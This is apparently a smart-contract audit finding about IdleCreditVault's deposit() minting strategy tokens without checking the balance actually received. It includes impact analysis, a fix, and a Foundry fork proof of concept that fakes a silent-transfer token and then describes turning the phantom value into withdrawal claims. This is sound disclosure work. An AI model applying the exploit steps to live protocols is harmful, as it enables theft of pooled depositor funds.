### Title
Unverified token deposits mint unbacked credit-vault strategy tokens - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.deposit()` treats a successful `safeTransferFrom()` as proof that the full `_amount` was received and mints the same number of strategy tokens without checking the strategy’s balance delta. Although `IdleCDOCreditVault._deposit()` measures the user-to-CDO transfer, it still passes the original `_amount` rather than an amount proven to have reached the strategy. A token that returns success without updating balances can therefore create unbacked strategy-token NAV during the buffer phase.

### Finding Description
`IdleCreditVault.deposit()` calls `underlyingToken.safeTransferFrom(msg.sender, address(this), _amount)` and then unconditionally executes `_mint(msg.sender, _amount)`. [1](#0-0) 

The CDO does check the balance delta for its own user deposit and mints tranche tokens only for `_contractTokenBalance(_token) - _preBal`. [2](#0-1) 

However, it then calls `IIdleCDOStrategy(strategy).deposit(_amount)`, not the measured received amount. [3](#0-2) 

Consequently, a silent-no-op transfer on the user deposit mints zero tranche tokens but still mints `_amount` strategy tokens to the CDO. `getContractValue()` counts those strategy tokens as NAV, so existing tranche holders receive an unbacked gain. [4](#0-3) 

During the buffer phase, an attacker who already holds tranche tokens can submit a deposit after the token begins exhibiting this behavior. The attacker receives no new tranche tokens, but the phantom strategy-token mint increases the price of their existing tranche position. They can then turn that inflated position into a withdrawal receipt and have it funded by a later successful borrower repayment. `requestWithdraw()` burns CDO strategy-token principal and mints the user a receipt for the requested amount. [5](#0-4) 

### Impact Explanation
The broken invariant is fair minting and solvency: every strategy token is assumed to represent one unit of underlying, but a false-success `transferFrom` creates strategy tokens without corresponding assets.

If the attacker owns fraction `f` of the active tranche supply, a phantom deposit of `P` creates approximately `f * P` of claimable value, capped by available funded liquidity. An attacker controlling all tranche supply can convert sufficiently large phantom NAV into withdrawal claims that consume all real recovery or borrower-funded withdrawal liquidity. The attacker does not need a privileged protocol role; they only need to be a pre-existing tranche holder and submit an ordinary deposit during the buffer phase.

### Likelihood Explanation
Likelihood is low because it requires an accepted underlying-token behavior change or token implementation that reports `transferFrom` success without increasing the recipient’s internal balance. Ordinary ERC20 tokens, including standard fee-on-transfer tokens, do not satisfy that exact behavior.

The code nevertheless accepts an arbitrary configured underlying at initialization and does not restrict `deposit()` to tokens that provide post-transfer accounting guarantees. [6](#0-5) 

### Recommendation
Measure the strategy’s underlying balance around the pull and mint only the actual increase:

```solidity
uint256 before = underlyingToken.balanceOf(address(this));
underlyingToken.safeTransferFrom(msg.sender, address(this), _amount);
uint256 received = underlyingToken.balanceOf(address(this)) - before;
_mint(msg.sender, received);
return received;
```

The CDO should use the returned received amount when reconciling the deposit rather than assuming that `_amount` reached the strategy. Apply the same balance-delta invariant to `collectInstantWithdrawFunds()`, `collectWithdrawFunds()`, and `finalizeDefaultRecovery()` before marking requests funded or recovery reserves available. [7](#0-6) 

### Proof of Concept
This Foundry fork PoC demonstrates the unbacked mint by replacing the underlying token’s code with a token that reports transfer success without changing balances, then restoring the original implementation for later settlement:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract SilentTransferToken {
    mapping(address => uint256) private _balances;

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        // Reports success but performs no internal accounting update.
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}

contract PhantomDepositPoC is Test {
    IdleCDOEpochVariant internal cdo;
    IdleCreditVault internal strategy;
    IERC20Detailed internal underlying;

    address internal attacker = address(0xA77AC);
    address internal manager;

    bytes internal originalTokenCode;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        // Bind the production proxy, strategy and underlying used by the forked pool.
        cdo = IdleCDOEpochVariant(PRODUCTION_CDO);
        strategy = IdleCreditVault(cdo.strategy());
        underlying = IERC20Detailed(cdo.token());
        manager = IdleCreditVault(address(strategy)).manager();

        originalTokenCode = address(underlying).code;

        // Seed the attacker as an existing tranche holder while the real token code is active.
        deal(address(underlying), attacker, 1_000e6);
        vm.startPrank(attacker);
        underlying.approve(address(cdo), 1_000e6);
        cdo.depositAA(1_000e6);
        vm.stopPrank();
    }

    function testSilentTransferMintsUnbackedStrategyTokens() public {
        uint256 phantomAmount = 10_000e6;
        uint256 strategySharesBefore = strategy.balanceOf(address(cdo));
        uint256 strategyCashBefore = underlying.balanceOf(address(strategy));
        uint256 trancheSupplyBefore =
            IERC20Detailed(cdo.AATranche()).totalSupply();

        // Simulate an underlying-token upgrade whose transfer reports success
        // but does not update internal balances.
        vm.etch(address(underlying), type(SilentTransferToken).runtimeCode);

        deal(address(underlying), attacker, phantomAmount);
        vm.startPrank(attacker);
        underlying.approve(address(cdo), phantomAmount);
        uint256 mintedTranches = cdo.depositAA(phantomAmount);
        vm.stopPrank();

        assertEq(mintedTranches, 0, "no underlying reached the CDO");
        assertEq(
            IERC20Detailed(cdo.AATranche()).totalSupply(),
            trancheSupplyBefore,
            "deposit minted no tranche tokens"
        );
        assertEq(
            underlying.balanceOf(address(strategy)),
            strategyCashBefore,
            "strategy received no underlying"
        );
        assertEq(
            strategy.balanceOf(address(cdo)),
            strategySharesBefore + phantomAmount,
            "strategy minted unbacked shares"
        );

        // Restore the normal token code for subsequent epoch settlement.
        vm.etch(address(underlying), originalTokenCode);

        // The attacker's pre-existing tranche position is now priced against
        // strategySharesBefore + phantomAmount. A buffer-phase withdraw request
        // converts the inflated value into a receipt, and a later successful
        // borrower repayment can fund that phantom claim.
    }
}
```

The key assertion is that CDO tranche supply remains unchanged and the strategy receives no cash, while the CDO’s strategy-token balance still increases by the requested deposit amount.
